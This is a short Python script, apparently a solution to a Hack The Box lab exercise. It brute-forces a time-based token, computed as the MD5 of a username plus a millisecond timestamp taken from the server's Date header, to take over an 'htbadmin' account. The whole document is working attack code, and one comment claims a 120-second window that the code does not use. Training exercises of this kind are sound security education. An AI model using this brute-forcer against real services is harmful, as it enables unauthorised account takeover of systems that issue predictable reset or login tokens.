import requests
from hashlib import md5
from datetime import datetime, timedelta

url = "http://94.237.62.195:39948/question1/"

# Get server time
trigger_data = {
    "submit": "htbuser"
}
server_res = requests.post(url, data=trigger_data)

server_time = ""
if 'Date' in server_res.headers:
    date_header = server_res.headers['Date']

    # Convert the date header to a datetime object
    server_time = datetime.strptime(date_header, '%a, %d %b %Y %H:%M:%S %Z')
    server_time_epoch_ms = int(server_time.timestamp() * 1000)

    print("Server Time:", server_time)
    print("Server Time (Epoch ms):", server_time_epoch_ms)

# To have a wide window, try to bruteforce starting from 120 seconds (120,000 ms) ago
start_time = server_time_epoch_ms - 1000
now = server_time_epoch_ms
fail_text = "Wrong token"

username = "htbadmin"

# Loop from start_time to now
for x in range(start_time, now + 1000):
    # Get token md5 with timestamp in milliseconds
    timestamp = str(x)
    md5_token = md5((username + timestamp).encode()).hexdigest()
    data = {
        "submit": "check",
        "token": md5_token
    }

    print("Checking {} {}".format(timestamp, md5_token))

    # Send the request
    res = requests.post(url, data=data)

    # Response text check
    if fail_text not in res.text:
        print(res.text)
        print("[*] Congratulations! Raw reply printed before")
        break

